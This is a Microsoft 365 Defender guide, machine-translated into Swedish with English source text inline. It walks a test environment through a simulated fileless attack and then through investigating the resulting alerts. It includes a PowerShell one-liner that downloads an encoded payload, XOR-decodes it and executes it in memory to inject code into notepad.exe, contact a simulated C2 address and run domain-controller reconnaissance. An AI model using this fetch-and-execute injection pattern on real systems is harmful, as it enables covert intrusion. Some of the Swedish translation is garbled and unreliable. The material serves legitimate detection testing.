---
title: Köra din Microsoft 365 Defender-attack simulering
description: Kör antecknings simuleringar för ditt Microsoft 365 Defender Pilot projekt för att se hur det är avkortat och snabbt åtgärdat.
keywords: Microsoft Threat Protection pilot-attack, kör Microsoft Threat Protection pilot attack simulering, simulera attack mot Microsoft Threat Protection, Microsoft Threat Protection Pilot-projekt, cyberterrorism-säkerhet, Avancerat, beständigt hot, företags säkerhet, enheter, enhet, identitet, användare, data, program, tillbud, automatisk undersökning och reparation, avancerad jakt
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: microsoft-365-enterprise
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.openlocfilehash: bfe7358d0549a664608c396870cb2b4a5cc58edf
ms.sourcegitcommit: 222fb7fe2b26dde3d8591b61cc02113d6135012c
ms.translationtype: MT
ms.contentlocale: sv-SE
ms.lasthandoff: 01/06/2021
ms.locfileid: "49760584"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a><span data-ttu-id="7ad86-104">Köra din Microsoft 365 Defender-attack simulering</span><span class="sxs-lookup"><span data-stu-id="7ad86-104">Run your Microsoft 365 Defender attack simulations</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|<span data-ttu-id="7ad86-105">[![Planering](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)</span><span class="sxs-lookup"><span data-stu-id="7ad86-105">[![Planning](../../media/phase-diagrams/1-planning.png)](mtp-pilot-plan.md)</span></span><br/>[<span data-ttu-id="7ad86-106">Planering</span><span class="sxs-lookup"><span data-stu-id="7ad86-106">Planning</span></span>](mtp-pilot-plan.md)|<span data-ttu-id="7ad86-107">[![Förbereda](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)</span><span class="sxs-lookup"><span data-stu-id="7ad86-107">[![Prepare](../../media/phase-diagrams/2-prepare.png)](prepare-mtpeval.md)</span></span><br/>[<span data-ttu-id="7ad86-108">Förberedelse</span><span class="sxs-lookup"><span data-stu-id="7ad86-108">Preparation</span></span>](prepare-mtpeval.md)|![Simulera attack](../../media/phase-diagrams/3-simluate.png)<br/><span data-ttu-id="7ad86-110">Simulera attack</span><span class="sxs-lookup"><span data-stu-id="7ad86-110">Simulate attack</span></span>|<span data-ttu-id="7ad86-111">[![Stäng och sammanfatta](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)</span><span class="sxs-lookup"><span data-stu-id="7ad86-111">[![Close and summarize](../../media/phase-diagrams/4-summary.png)](mtp-pilot-close.md)</span></span><br/>[<span data-ttu-id="7ad86-112">Stäng och sammanfatta</span><span class="sxs-lookup"><span data-stu-id="7ad86-112">Close and summarize</span></span>](mtp-pilot-close.md)|
|--|--|--|--|
|||<span data-ttu-id="7ad86-113">*Nu är det här!*</span><span class="sxs-lookup"><span data-stu-id="7ad86-113">*You are here!*</span></span>||

<span data-ttu-id="7ad86-114">Du befinner dig i fasen för att angripen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-114">You're currently in the attack simulation phase.</span></span>

<span data-ttu-id="7ad86-115">När du har förberedat din pilot miljö är det dags att testa Microsoft 365 Defender tillbud-hanteringen och automatisk utredning och reparations kapacitet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-115">After preparing your pilot environment, it's time to test the Microsoft 365 Defender incident management and automated investigation and remediation capabilities.</span></span> <span data-ttu-id="7ad86-116">Vi hjälper dig att simulera en sofistikerad attack som använder avancerade tekniker för att dölja mot identifiering.</span><span class="sxs-lookup"><span data-stu-id="7ad86-116">We'll help you to simulate a sophisticated attack that leverages advanced techniques to hide from detection.</span></span> <span data-ttu-id="7ad86-117">Angrepps funktionen räknar upp öppnade SMB-sessioner (Server Message Block) på domän kontrol Lanterna och hämtar de senaste IP-adresserna för användarnas enheter.</span><span class="sxs-lookup"><span data-stu-id="7ad86-117">The attack enumerates opened Server Message Block (SMB) sessions on domain controllers and retrieves recent IP addresses of users' devices.</span></span> <span data-ttu-id="7ad86-118">Den här kategorin av attacker inkluderar vanligt vis inte filer som ignorerats på den skadelidandes enhet – de är bara i minnet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-118">This category of attacks usually doesn't include files dropped on the victim's device—they occur solely in memory.</span></span> <span data-ttu-id="7ad86-119">De "bor utanför marken" genom att använda befintliga system-och administrations verktyg och injicera sin kod i system processer för att dölja deras utförande, så att de kan Evade identifiering och bevaras på enheten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-119">They "live off the land" by using existing system and administrative tools and inject their code into system processes to hide their execution, Such behavior allows them to evade detection and persist on the device.</span></span>

<span data-ttu-id="7ad86-120">I den här simuleringen börjar vårt exempel scenario med ett PowerShell-skript.</span><span class="sxs-lookup"><span data-stu-id="7ad86-120">In this simulation, our sample scenario starts with a PowerShell script.</span></span> <span data-ttu-id="7ad86-121">En användare kan ha svårt att köra ett skript.</span><span class="sxs-lookup"><span data-stu-id="7ad86-121">A user might be tricked into running a script.</span></span> <span data-ttu-id="7ad86-122">Eller så kan ett skript köras från en fjärr anslutning till en annan dator från en tidigare infekterad enhet – angriparen försöker flytta på ett senare plats i nätverket.</span><span class="sxs-lookup"><span data-stu-id="7ad86-122">Or the script might run from a remote connection to another computer from a previously infected device—the attacker attempting to move laterally in the network.</span></span> <span data-ttu-id="7ad86-123">Det kan vara svårt att identifiera dessa skript eftersom administratörer ofta kör skript för att utföra olika administrativa aktiviteter.</span><span class="sxs-lookup"><span data-stu-id="7ad86-123">Detection of these scripts can be difficult because administrators also often run scripts remotely to carry out various administrative activities.</span></span>

![Reconnaisance PowerShell-attack med process inmatning och SMB-](../../media/mtp/mtpdiydiagram.png)

<span data-ttu-id="7ad86-125">Under simuleringen injicerar angreppet shellcode i en Innocent process.</span><span class="sxs-lookup"><span data-stu-id="7ad86-125">During the simulation, the attack injects shellcode into a seemingly innocent process.</span></span> <span data-ttu-id="7ad86-126">Scenariot kräver användning av notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="7ad86-126">The scenario requires the use of notepad.exe.</span></span> <span data-ttu-id="7ad86-127">Vi valde den här processen för simuleringen, men angriparen skulle förmodligen ha troligt vis en lång tids krävande system process, till exempel svchost.exe.</span><span class="sxs-lookup"><span data-stu-id="7ad86-127">We chose this process for the simulation, but attackers would more likely target a long-running system process, such as svchost.exe.</span></span> <span data-ttu-id="7ad86-128">Shellcode väljer sedan för att kontakta angriparens kommando-och-kontroll (C2)-Server för att få anvisningar om hur du ska fortsätta.</span><span class="sxs-lookup"><span data-stu-id="7ad86-128">The shellcode then goes on to contact the attacker's command-and-control (C2) server to receive instructions on how to proceed.</span></span> <span data-ttu-id="7ad86-129">Skriptet försöker köra Reconnaissance frågor mot domän kontrol Lanterna (DC).</span><span class="sxs-lookup"><span data-stu-id="7ad86-129">The script attempts executing reconnaissance queries against the domain controller (DC).</span></span> <span data-ttu-id="7ad86-130">Med Reconnaissance kan en angripare få information om de senaste inloggnings uppgifterna.</span><span class="sxs-lookup"><span data-stu-id="7ad86-130">Reconnaissance allows an attacker to get information about recent user login information.</span></span> <span data-ttu-id="7ad86-131">När angriparen har den här informationen kan de vid ett senare tillfälle gå vidare till ett specifikt känsligt konto</span><span class="sxs-lookup"><span data-stu-id="7ad86-131">Once attackers have this information, they can move laterally in the network to get to a specific sensitive account</span></span>

> [!IMPORTANT]
> <span data-ttu-id="7ad86-132">För optimalt resultat följer du anvisningarna för att simulera angrepp så nära som möjligt.</span><span class="sxs-lookup"><span data-stu-id="7ad86-132">For optimum results, follow the attack simulation instructions as closely as possible.</span></span>

## <a name="simulation-environment-requirements"></a><span data-ttu-id="7ad86-133">System krav för simulering</span><span class="sxs-lookup"><span data-stu-id="7ad86-133">Simulation environment requirements</span></span>

<span data-ttu-id="7ad86-134">Eftersom du redan har konfigurerat din pilot miljö under förberedelse fasen bör du kontrol lera att du har två enheter för det här scenariot: en testen het och en domänkontrollant.</span><span class="sxs-lookup"><span data-stu-id="7ad86-134">Since you have already configured your pilot environment during the preparation phase, ensure that you have two devices for this scenario: a test device and a domain controller.</span></span>

1. <span data-ttu-id="7ad86-135">Kontrol lera att din klient organisation har [aktiverat Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span><span class="sxs-lookup"><span data-stu-id="7ad86-135">Verify your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>

2. <span data-ttu-id="7ad86-136">Verifiera konfigurationen för din testdomänkontrollant:</span><span class="sxs-lookup"><span data-stu-id="7ad86-136">Verify your test domain controller configuration:</span></span>

   - <span data-ttu-id="7ad86-137">Enheten körs med Windows Server 2008 R2 eller en senare version.</span><span class="sxs-lookup"><span data-stu-id="7ad86-137">Device runs with Windows Server 2008 R2 or a later version.</span></span>
   - <span data-ttu-id="7ad86-138">Testa domänkontrollanten till [Microsoft Defender för identitet](https://docs.microsoft.com/azure/security-center/security-center-wdatp) och aktivera [fjärrhantering](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span><span class="sxs-lookup"><span data-stu-id="7ad86-138">The test domain controller to [Microsoft Defender for Identity](https://docs.microsoft.com/azure/security-center/security-center-wdatp) and enable [remote management](https://docs.microsoft.com/windows-server/administration/server-manager/configure-remote-management-in-server-manager).</span></span>
   - <span data-ttu-id="7ad86-139">Kontrol lera att [Microsoft Defender för identitet och Microsoft Cloud App-säkerhetsintegrering](https://docs.microsoft.com/cloud-app-security/mdi-integration) har Aktiver ATS.</span><span class="sxs-lookup"><span data-stu-id="7ad86-139">Verify that [Microsoft Defender for Identity and Microsoft Cloud App Security integration](https://docs.microsoft.com/cloud-app-security/mdi-integration) have been enabled.</span></span>
   - <span data-ttu-id="7ad86-140">En test användare skapas på din domän – inga administratörs behörigheter behövs.</span><span class="sxs-lookup"><span data-stu-id="7ad86-140">A test user is created on your domain – no admin permissions needed.</span></span>

3. <span data-ttu-id="7ad86-141">Verifiera test enhetens konfiguration:</span><span class="sxs-lookup"><span data-stu-id="7ad86-141">Verify test device configuration:</span></span>

   1. <span data-ttu-id="7ad86-142">Enheten körs med Windows 10 version 1903 eller senare.</span><span class="sxs-lookup"><span data-stu-id="7ad86-142">Device runs with Windows 10 version 1903 or a later version.</span></span>

   1. <span data-ttu-id="7ad86-143">Testen het är ansluten till test domänen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-143">Test device is joined to the test domain.</span></span>

   1. <span data-ttu-id="7ad86-144">[Aktivera Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="7ad86-144">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="7ad86-145">Om du har problem med att aktivera Windows Defender Antivirus kan du läsa det här [avsnittet fel sökning](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="7ad86-145">If you are having trouble enabling Windows Defender Antivirus, see this [troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>

   1. <span data-ttu-id="7ad86-146">Kontrol lera att test enheten är [inbyggd i Microsoft Defender för slut punkten)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="7ad86-146">Verify that the test device is [onboarded to Microsoft Defender for Endpoint)](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

<span data-ttu-id="7ad86-147">Om du använder en befintlig klient organisation och implementerar enhets grupper skapar du en dedikerad enhets grupp för test enheten och skickar den till toppnivån i konfigurations gränssnittet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-147">If you use an existing tenant and implement device groups, create a dedicated device group for the test device and push it to top level in configuration UX.</span></span>

## <a name="run-the-attack-scenario-simulation"></a><span data-ttu-id="7ad86-148">Köra simuleringen av attack scenario</span><span class="sxs-lookup"><span data-stu-id="7ad86-148">Run the attack scenario simulation</span></span>

<span data-ttu-id="7ad86-149">Så här kör du en simulering av angrepps scenario:</span><span class="sxs-lookup"><span data-stu-id="7ad86-149">To run the attack scenario simulation:</span></span>

1. <span data-ttu-id="7ad86-150">Logga in på test enheten med testet användar konto.</span><span class="sxs-lookup"><span data-stu-id="7ad86-150">Log in to the test device with the test user account.</span></span>

2. <span data-ttu-id="7ad86-151">Öppna ett Windows PowerShell-fönster på test enheten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-151">Open a Windows PowerShell window on the test device.</span></span>

3. <span data-ttu-id="7ad86-152">Kopiera följande simulerings skript:</span><span class="sxs-lookup"><span data-stu-id="7ad86-152">Copy the following simulation script:</span></span>

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > <span data-ttu-id="7ad86-153">Om du öppnar det här dokumentet i en webbläsare kanske du stöter på problem när du kopierar hela texten utan att förlora vissa tecken eller introducerar extra rad brytningar.</span><span class="sxs-lookup"><span data-stu-id="7ad86-153">If you open this document on a web browser, you might encounter problems copying the full text without losing certain characters or introducing extra line breaks.</span></span> <span data-ttu-id="7ad86-154">Ladda ner det här dokumentet och öppna det i Adobe Reader.</span><span class="sxs-lookup"><span data-stu-id="7ad86-154">Download this document and open it on Adobe Reader.</span></span>

4. <span data-ttu-id="7ad86-155">När du uppmanas till det klistrar du in och kör det kopierade skriptet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-155">At the prompt, paste and run the copied script.</span></span>

> [!NOTE]
> <span data-ttu-id="7ad86-156">Om du kör PowerShell med hjälp av RDP (Remote Desktop Protocol) kan du använda kommandot Skriv Clipboard-text i RDP-klienten eftersom det kanske inte fungerar med **CTRL-V** -kortkommandot eller en högerklickning-metod.</span><span class="sxs-lookup"><span data-stu-id="7ad86-156">If you're running PowerShell using remote desktop protocol (RDP), use the Type Clipboard Text command in the RDP client because the **CTRL-V** hotkey or right-click-paste method might not work.</span></span> <span data-ttu-id="7ad86-157">De senaste versionerna av PowerShell accepterar ibland inte den metoden, du kan behöva kopiera till anteckningar i minnet först och sedan klistra in den i PowerShell.</span><span class="sxs-lookup"><span data-stu-id="7ad86-157">Recent versions of PowerShell sometimes will also not accept that method, you might have to copy to Notepad in memory first, copy it in the virtual machine, and then paste it into PowerShell.</span></span>

<span data-ttu-id="7ad86-158"><i>notepad.exe</i> öppnas ett par sekunder.</span><span class="sxs-lookup"><span data-stu-id="7ad86-158">A few seconds later, <i>notepad.exe</i> will open.</span></span> <span data-ttu-id="7ad86-159">En simulerad attack kod kommer att matas in i notepad.exe.</span><span class="sxs-lookup"><span data-stu-id="7ad86-159">A simulated attack code will be injected into notepad.exe.</span></span> <span data-ttu-id="7ad86-160">Håll den automatiskt skapade Notepad-instansen öppen så får du hela scenariot.</span><span class="sxs-lookup"><span data-stu-id="7ad86-160">Keep the automatically generated Notepad instance open to experience the full scenario.</span></span>

<span data-ttu-id="7ad86-161">Den simulerade angreppet försöker kommunicera med en extern IP-adress (som simulerar C2-servern) och sedan försöker Reconnaissance mot domänkontrollanten via SMB.</span><span class="sxs-lookup"><span data-stu-id="7ad86-161">The simulated attack code will attempt to communicate to an external IP address (simulating the C2 server) and then attempt reconnaissance against the domain controller through SMB.</span></span>

<span data-ttu-id="7ad86-162">Du ser ett meddelande som visas på PowerShell-konsolen när det här skriptet är klart.</span><span class="sxs-lookup"><span data-stu-id="7ad86-162">You'll see a message displayed on the PowerShell console when this script completes.</span></span>

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

<span data-ttu-id="7ad86-163">Om du vill se funktionen automatisk incident och svar håller du notepad.exe processen öppen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-163">To see the Automated Incident and Response feature in action, keep the notepad.exe process open.</span></span> <span data-ttu-id="7ad86-164">Du ser automatiskt samtal och svar stoppa antecknings processen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-164">You'll see Automated Incident and Response stop the Notepad process.</span></span>

## <a name="investigate-an-incident"></a><span data-ttu-id="7ad86-165">Undersök en olycka</span><span class="sxs-lookup"><span data-stu-id="7ad86-165">Investigate an incident</span></span>

> [!NOTE]
> <span data-ttu-id="7ad86-166">Innan vi vägleder dig via den här simuleringen kan du titta på följande video för att se hur fel söknings hanteringen hjälper dig att ringa upp relaterade meddelanden tillsammans som en del av gransknings processen, där du kan hitta den på portalen och hur den kan hjälpa dig i dina säkerhets åtgärder:</span><span class="sxs-lookup"><span data-stu-id="7ad86-166">Before we walk you through this simulation, watch the following video to see how incident management helps you piece the related alerts together as part of the investigation process, where you can find it in the portal, and how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

<span data-ttu-id="7ad86-167">Om du växlar till SOC analytiker kan du börja undersöka anslagen i Microsoft 365 Security Center-portalen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-167">Switching to the SOC analyst point of view, you can now start to investigate the attack in the Microsoft 365 Security Center portal.</span></span>

1. <span data-ttu-id="7ad86-168">Öppna [Microsoft 365 Security Center-portalens](https://security.microsoft.com/incidents) incident kö från valfri enhet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-168">Open the [Microsoft 365 Security Center portal](https://security.microsoft.com/incidents) incident queue from any device.</span></span>

2. <span data-ttu-id="7ad86-169">Navigera till **incidenter** från menyn.</span><span class="sxs-lookup"><span data-stu-id="7ad86-169">Navigate to **Incidents** from the menu.</span></span>

    ![Skärm bild av händelser som visas på vänster-menyn i Microsoft 365 Security Center](../../media/mtp/fig1.png)

3. <span data-ttu-id="7ad86-171">Den nya incidenten för det simulerade angreppet visas i incident kön.</span><span class="sxs-lookup"><span data-stu-id="7ad86-171">The new incident for the simulated attack will appear in the incident queue.</span></span>

    ![Skärm bild av incident kön](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a><span data-ttu-id="7ad86-173">Undersök angreppet som en enda olycka</span><span class="sxs-lookup"><span data-stu-id="7ad86-173">Investigate the attack as a single incident</span></span>

<span data-ttu-id="7ad86-174">Microsoft 365 Defender korrelerar analyser och sammanställda alla relaterade varningar och undersökningar från olika produkter till en olycka-enhet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-174">Microsoft 365 Defender correlates analytics and aggregates all related alerts and investigations from different products into one incident entity.</span></span> <span data-ttu-id="7ad86-175">Genom att göra så visar Microsoft 365 Defender en bredare attack artikel som gör att SOC analytiker förstår och svarar på komplexa hot.</span><span class="sxs-lookup"><span data-stu-id="7ad86-175">By doing so, Microsoft 365 Defender shows a broader attack story, allowing the SOC analyst to understand and respond to complex threats.</span></span>

<span data-ttu-id="7ad86-176">De notifieringar som genereras under simuleringen är kopplade till samma hot, och som ett resultat aggregeras automatiskt som en enda händelse.</span><span class="sxs-lookup"><span data-stu-id="7ad86-176">The alerts generated during this simulation are associated with the same threat, and as a result, are automatically aggregated as a single incident.</span></span>

<span data-ttu-id="7ad86-177">Så här visar du felet:</span><span class="sxs-lookup"><span data-stu-id="7ad86-177">To view the incident:</span></span>

1. <span data-ttu-id="7ad86-178">Gå till kön för **incidenter** .</span><span class="sxs-lookup"><span data-stu-id="7ad86-178">Navigate to the **Incidents** queue.</span></span>

   ![Skärm bild av händelser från navigerings menyn](../../media/mtp/fig1.png)

2. <span data-ttu-id="7ad86-180">Välj det senaste objektet genom att klicka på den cirkel som står till vänster om händelse namnet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-180">Select the newest item by clicking on the circle located left of the incident name.</span></span> <span data-ttu-id="7ad86-181">En sido panel visar ytterligare information om felet, inklusive alla relaterade aviseringar.</span><span class="sxs-lookup"><span data-stu-id="7ad86-181">A side panel displays additional information about the incident, including all the related alerts.</span></span> <span data-ttu-id="7ad86-182">Varje händelse har ett unikt namn som beskriver baserat på attributen för de aviseringar Den innehåller.</span><span class="sxs-lookup"><span data-stu-id="7ad86-182">Each incident has a unique name that describes it based on the attributes of the alerts it includes.</span></span>

   ![Skärm bild av sidan incidenter där genererade aviseringar aggregeras under simuleringen](../../media/mtp/fig4.png)

   <span data-ttu-id="7ad86-184">Aviseringarna som visas i instrument panelen kan filtreras baserat på tjänst resurser: Microsoft Defender för identitet, Microsoft Cloud App Security, Microsoft Defender för slut punkt, Microsoft 365 Defender och Microsoft Defender för Office 365.</span><span class="sxs-lookup"><span data-stu-id="7ad86-184">The alerts that show in the dashboard can be filtered based on service resources: Microsoft Defender for Identity, Microsoft Cloud App Security, Microsoft Defender for Endpoint, Microsoft 365 Defender, and Microsoft Defender for Office 365.</span></span>

3. <span data-ttu-id="7ad86-185">Välj **Öppna sidan incident** för att få mer information om felet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-185">Select **Open incident page** to get more information about the incident.</span></span>

   <span data-ttu-id="7ad86-186">På sidan **incident** kan du se alla aviseringar och information som rör händelsen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-186">In the **Incident** page, you can see all the alerts and information related to the incident.</span></span> <span data-ttu-id="7ad86-187">Informationen inkluderar de enheter och till gångar som är involverade i aviseringen, identifierings källan för aviseringarna (Microsoft Defender för identitet, EDR) och anledningen till att de sammanlänkade.</span><span class="sxs-lookup"><span data-stu-id="7ad86-187">The information includes the entities and assets that are involved in the alert, the detection source of the alerts (Microsoft Defender for Identity, EDR), and the reason they were linked together.</span></span> <span data-ttu-id="7ad86-188">Om du granskar samtals listan visas meddelandets förlopp.</span><span class="sxs-lookup"><span data-stu-id="7ad86-188">Reviewing the incident alert list shows the progression of the attack.</span></span> <span data-ttu-id="7ad86-189">I den här vyn kan du se och undersöka de enskilda varningarna.</span><span class="sxs-lookup"><span data-stu-id="7ad86-189">From this view, you can see and investigate the individual alerts.</span></span>

   <span data-ttu-id="7ad86-190">Du kan också klicka på **Hantera incident** från den högra menyn för att tagga händelsen, tilldela den till dig själv och lägga till kommentarer.</span><span class="sxs-lookup"><span data-stu-id="7ad86-190">You can also click **Manage incident** from the right-hand menu, to tag the incident, assign it to yourself, and add comments.</span></span>

   ![Skärm bild av var du klickar på Hantera incidenten](../../media/mtp/fig5a.png)

   ![<span data-ttu-id="7ad86-192">Skärm bild av fälten på panelen hantera incidenter där du kan tagga incidenten, tilldela den till dig själv och lägga till kommentarer</span><span class="sxs-lookup"><span data-stu-id="7ad86-192">Screenshot of the fields on the manage incident panel where you can tag the incident, assign it to yourself, and add comments</span></span> ](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a><span data-ttu-id="7ad86-193">Granska genererade aviseringar</span><span class="sxs-lookup"><span data-stu-id="7ad86-193">Review generated alerts</span></span>

<span data-ttu-id="7ad86-194">Låt oss titta på några av de varningar som genereras under det simulerade angreppet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-194">Let's look at some of the alerts generated during the simulated attack.</span></span>

> [!NOTE]
> <span data-ttu-id="7ad86-195">Vi går igenom bara några av de varningar som genereras under det simulerade angreppet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-195">We'll walk through only a few of the alerts generated during the simulated attack.</span></span> <span data-ttu-id="7ad86-196">Beroende på vilken version av Windows och Microsoft 365 Defender-produkterna som körs på din test telefon kan du se fler aviseringar som visas lite annorlunda.</span><span class="sxs-lookup"><span data-stu-id="7ad86-196">Depending on the version of Windows and the Microsoft 365 Defender products running on your test device, you might see more alerts that appear in a slightly different order.</span></span>

![Skärm bild av genererade aviseringar](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="7ad86-198">Varning: misstänkt process inmatning (Källa: Microsoft Defender för slut punkt EDR)</span><span class="sxs-lookup"><span data-stu-id="7ad86-198">Alert: Suspicious process injection observed (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="7ad86-199">Avancerade angripare använder avancerade och stealthy metoder för att spara i minnet och dölja från detektions verktyg.</span><span class="sxs-lookup"><span data-stu-id="7ad86-199">Advanced attackers use sophisticated and stealthy methods to persist in memory and hide from detection tools.</span></span> <span data-ttu-id="7ad86-200">En gemensam teknik är att fungera i en betrodd system process i stället för en illvillig körbar fil, vilket gör den svår att upptäcka för identifierings verktyg och säkerhets åtgärder för att upptäcka den skadliga koden.</span><span class="sxs-lookup"><span data-stu-id="7ad86-200">One common technique is to operate from within a trusted system process rather than a malicious executable, making it hard for detection tools and security operations to spot the malicious code.</span></span>

<span data-ttu-id="7ad86-201">För att SOC-analytikerna ska kunna fånga de här avancerade angreppen ger djupt minnes sensorer i Microsoft Defender för slut punkter vår moln tjänst med oöverträffad synbarhet i en mängd olika metoder för kod inmatning med flera processer.</span><span class="sxs-lookup"><span data-stu-id="7ad86-201">To allow the SOC analysts to catch these advanced attacks, deep memory sensors in Microsoft Defender for Endpoint provide our cloud service with unprecedented visibility into a variety of cross-process code injection techniques.</span></span> <span data-ttu-id="7ad86-202">I följande bild visas hur Defender för slut punkten identifieras och aviseringar om försöket att injicera kod till <i>notepad.exe</i>.</span><span class="sxs-lookup"><span data-stu-id="7ad86-202">The following figure shows how Defender for Endpoint detected and alerted on the attempt to inject code to <i>notepad.exe</i>.</span></span>

![Skärm bild av aviseringen för inmatning av potentiellt skadlig kod](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a><span data-ttu-id="7ad86-204">Avisering: oväntat beteende som observerats av en process som körs utan kommando rads argument (Source: Microsoft Defender för slut punkts EDR)</span><span class="sxs-lookup"><span data-stu-id="7ad86-204">Alert: Unexpected behavior observed by a process run with no command-line arguments (Source: Microsoft Defender for Endpoint EDR)</span></span>

<span data-ttu-id="7ad86-205">Microsoft Defender för slut punkts identifiering riktar sig ofta till det vanligaste attributet för en attack teknik.</span><span class="sxs-lookup"><span data-stu-id="7ad86-205">Microsoft Defender for Endpoint detections often target the most common attribute of an attack technique.</span></span> <span data-ttu-id="7ad86-206">Den här metoden säkerställer hållbarheten och gör att angriparen kan växla till nyare taktiker.</span><span class="sxs-lookup"><span data-stu-id="7ad86-206">This method ensures durability and raises the bar for attackers to switch to newer tactics.</span></span>

<span data-ttu-id="7ad86-207">Vi använder storskaliga Learning-algoritmer för att fastställa normal beteende för vanliga processer i en organisation och över hela världen och titta efter när dessa processer visar avvikande beteenden.</span><span class="sxs-lookup"><span data-stu-id="7ad86-207">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="7ad86-208">Dessa avvikande beteenden indikerar ofta att den extra koden införts och att den körs i en betrodd process.</span><span class="sxs-lookup"><span data-stu-id="7ad86-208">These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.</span></span>

<span data-ttu-id="7ad86-209">I det här scenariot uppvisar process <i>notepad.exe</i> onormalt beteende, med kommunikation med en extern plats.</span><span class="sxs-lookup"><span data-stu-id="7ad86-209">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="7ad86-210">Resultatet är oberoende av den specifika metod som används för att introducera och exekvera skadlig kod.</span><span class="sxs-lookup"><span data-stu-id="7ad86-210">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="7ad86-211">Eftersom den här aviseringen baseras på datorer som kräver ytterligare Server dels bearbetning kan det ta lite tid innan du ser den här aviseringen i portalen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-211">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="7ad86-212">Observera att aviserings informationen inkluderar den externa IP-adressen – en indikator som du kan använda för att utöka undersökningen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-212">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="7ad86-213">Välj IP-adressen i aviserings process trädet för att visa sidan IP-adress information.</span><span class="sxs-lookup"><span data-stu-id="7ad86-213">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![Skärm bild av aviseringen om en process inte fungerar utan kommando rads argument](../../media/mtp/fig8.png)

<span data-ttu-id="7ad86-215">I följande bild visas sidan för vald IP-adress (klicka på IP-adress i aviserings process trädet).</span><span class="sxs-lookup"><span data-stu-id="7ad86-215">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
